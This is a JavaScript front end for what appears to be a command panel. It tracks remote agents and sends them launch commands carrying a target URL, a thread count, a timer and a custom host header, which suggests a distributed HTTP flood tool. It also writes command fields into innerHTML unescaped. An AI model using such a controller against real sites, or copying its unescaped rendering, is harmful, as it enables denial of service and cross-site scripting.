// main.js

document.addEventListener("DOMContentLoaded", () => {
  const agentBody      = document.getElementById("agentBody");
  const agentEmptyRow  = document.getElementById("agentEmptyRow");
  const historyBody    = document.getElementById("historyBody");
  const historyEmpty   = document.getElementById("historyEmptyRow");
  const blinkDot       = document.getElementById("blinkDot");
  const onlineCount    = document.getElementById("onlineCount");
  const form           = document.getElementById("commandForm");
  const submitBtn      = document.getElementById("submitBtn");
  const formError      = document.getElementById("formError");

  // Auth token — set this to match SERVER_TOKEN env var on the control server.
  // Leave empty if the server is running without authentication (dev mode).
  const AUTH_TOKEN = "";

  // Track agent rows by agentID so we can update in-place.
  const agentRows = {};

  // ── Helpers ────────────────────────────────────────────────────────────────

  function formatTime(iso) {
    try { return new Date(iso).toLocaleString(); }
    catch { return iso; }
  }

  function authHeaders() {
    const h = {};
    if (AUTH_TOKEN) h["Authorization"] = `Bearer ${AUTH_TOKEN}`;
    return h;
  }

  function setSubmitting(isSubmitting) {
    submitBtn.disabled = isSubmitting;
    submitBtn.classList.toggle("loading", isSubmitting);
    submitBtn.querySelector(".btn-text").textContent = isSubmitting ? "Sending…" : "Launch";
  }

  function showFormError(msg) {
    formError.textContent = msg;
    formError.classList.add("visible");
  }

  function clearFormError() {
    formError.textContent = "";
    formError.classList.remove("visible");
  }

  // ── Agent status ───────────────────────────────────────────────────────────

  function updateOnlineCount() {
    const count = agentBody.querySelectorAll("tr.online").length;
    onlineCount.textContent = count;
    // Toggle blink animation via class rather than visibility,
    // so the CSS animation engine stops running when there are no agents.
    blinkDot.classList.toggle("active", count > 0);
    agentEmptyRow.style.display =
      agentBody.querySelectorAll("tr:not(#agentEmptyRow)").length === 0 ? "" : "none";
  }

  // Handles both the SSE "agent-status-changed" event and the initial fetch.
  // Server sends: { agentID: string, status: AgentStatus }
  function onAgentStatusChanged(payload) {
    const { agentID, status: info } = payload;
    if (!agentID || !info) return;

    let row = agentRows[agentID];
    if (!row) {
      row = document.createElement("tr");
      row.setAttribute("data-agentid", agentID);
      row.innerHTML = `
        <td class="agent-id-cell"></td>
        <td class="online-cell"></td>
        <td class="status-cell"></td>
        <td class="lastping-cell"></td>
      `;
      // Insert before the empty placeholder row so the placeholder stays last.
      agentBody.insertBefore(row, agentEmptyRow);
      agentRows[agentID] = row;
    }

    row.querySelector(".agent-id-cell").textContent = agentID;

    const isOnline = Boolean(info.Online);
    row.querySelector(".online-cell").textContent = isOnline ? "Online" : "Offline";
    row.classList.toggle("online", isOnline);
    row.classList.toggle("offline", !isOnline);

    row.querySelector(".status-cell").textContent = info.Status || "—";
    row.querySelector(".lastping-cell").textContent =
      info.LastPing ? formatTime(info.LastPing) : "—";

    updateOnlineCount();
  }

  // ── Command history ────────────────────────────────────────────────────────
 
  // Track recently-added URLs to deduplicate SSE echoes of our own submissions.
  // Key: `${url}|${threads}|${timer}`, value: timestamp ms. Entries expire after 5 s.
  const recentSubmits = new Map();
 
  function addHistoryRow(command, fromSSE = false) {
    const dedupeKey = `${command.url}|${command.threads}|${command.timer}`;
 
    if (fromSSE) {
      // If we submitted this ourselves in the last 5 s, skip — we already added it.
      const ts = recentSubmits.get(dedupeKey);
      if (ts && Date.now() - ts < 5000) return;
    } else {
      // Record the submit time so the SSE echo is ignored.
      recentSubmits.set(dedupeKey, Date.now());
      setTimeout(() => recentSubmits.delete(dedupeKey), 5000);
    }
 
    // Hide empty placeholder.
    historyEmpty.style.display = "none";
 
    const tr = document.createElement("tr");
    tr.classList.add("history-new");
 
    const fields = ["url", "threads", "timer", "custom_host"];
    tr.innerHTML = `<td>${new Date().toLocaleString()}</td>` +
      fields.map(k => `<td>${command[k] != null ? command[k] : "—"}</td>`).join("");
 
    historyBody.insertBefore(tr, historyBody.firstChild);
    requestAnimationFrame(() => tr.classList.add("visible"));
  }
 
  // ── SSE events ─────────────────────────────────────────────────────────────

  // The server sends the raw Command object on "command-enqueued", not { command }.
  // Fix: treat ev.data directly as a Command.
  function onCommandEnqueued(command) {
    if (command && command.action === "start") {
      addHistoryRow(command, true);
    }
  }

  // ── Form submission ────────────────────────────────────────────────────────

  form.addEventListener("submit", async e => {
    e.preventDefault();
    clearFormError();

    const formData = new FormData(form);

    // Client-side validation beyond HTML attributes.
    const rawURL = (formData.get("url") || "").trim();
    try {
      const u = new URL(rawURL);
      if (u.protocol !== "http:" && u.protocol !== "https:") throw new Error();
    } catch {
      showFormError("Please enter a valid http:// or https:// URL.");
      return;
    }

    setSubmitting(true);

    try {
      const res = await fetch("/command", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          ...authHeaders(),
        },
        body: new URLSearchParams(formData).toString(),
      });

      if (!res.ok) {
        const text = await res.text();
        throw new Error(text || `Server returned ${res.status}`);
      }

      // The SSE "command-enqueued" event will fire and add the history row.
      // We do NOT add it here too — that would cause duplicate rows.
      form.reset();
    } catch (err) {
      showFormError(err.message);
    } finally {
      setSubmitting(false);
    }
  });

  // ── Initial data fetch ─────────────────────────────────────────────────────

  function fetchCommandHistory() {
    fetch("/command-history", { headers: authHeaders() })
      .then(r => {
        if (!r.ok) throw new Error(`/command-history returned ${r.status}`);
        return r.json();
      })
      .then(cmds => {
        // Clear existing rows before repopulating to avoid duplicates on reconnect.
        historyBody.querySelectorAll("tr:not(#historyEmptyRow)").forEach(r => r.remove());
        recentSubmits.clear();
        if (!Array.isArray(cmds) || cmds.length === 0) {
          historyEmpty.style.display = "";
          return;
        }
        historyEmpty.style.display = "none";
        cmds.forEach(cmd => {
          if (cmd.action !== "start") return;
          const tr = document.createElement("tr");
          const fields = ["url", "threads", "timer", "custom_host"];
          tr.innerHTML = `<td>${new Date().toLocaleString()}</td>` +
            fields.map(k => `<td>${cmd[k] != null ? cmd[k] : "—"}</td>`).join("");
          historyBody.appendChild(tr);
        });
      })
      .catch(err => console.warn("Failed to load command history:", err));
  }

  function fetchAgentStatuses() {
    fetch("/agent-statuses", { headers: authHeaders() })
      .then(r => {
        if (!r.ok) throw new Error(`/agent-statuses returned ${r.status}`);
        return r.json();
      })
      .then(all => {
        Object.entries(all).forEach(([id, info]) =>
          onAgentStatusChanged({ agentID: id, status: info })
        );
      })
      .catch(err => console.warn("Failed to load agent statuses:", err));
  }

  fetchAgentStatuses();
  fetchCommandHistory();

  // ── SSE connection ─────────────────────────────────────────────────────────

  let evt;

  function connectSSE() {
    evt = new EventSource("/events");

    // Re-fetch all statuses on reconnect so the table is always consistent.
    evt.onopen = () => {
      console.info("[SSE] connected");
      fetchAgentStatuses();
    };

    evt.addEventListener("agent-status-changed", ev => {
      try {
        onAgentStatusChanged(JSON.parse(ev.data));
      } catch (err) {
        console.error("[SSE] bad agent-status-changed payload:", err);
      }
    });

    evt.addEventListener("command-enqueued", ev => {
      try {
        onCommandEnqueued(JSON.parse(ev.data));
      } catch (err) {
        console.error("[SSE] bad command-enqueued payload:", err);
      }
    });

    evt.onerror = err => {
      console.warn("[SSE] error — browser will auto-reconnect:", err);
      // EventSource handles reconnection automatically.
      // onopen fires again on reconnect, which re-fetches agent statuses.
    };
  }

  connectSSE();
});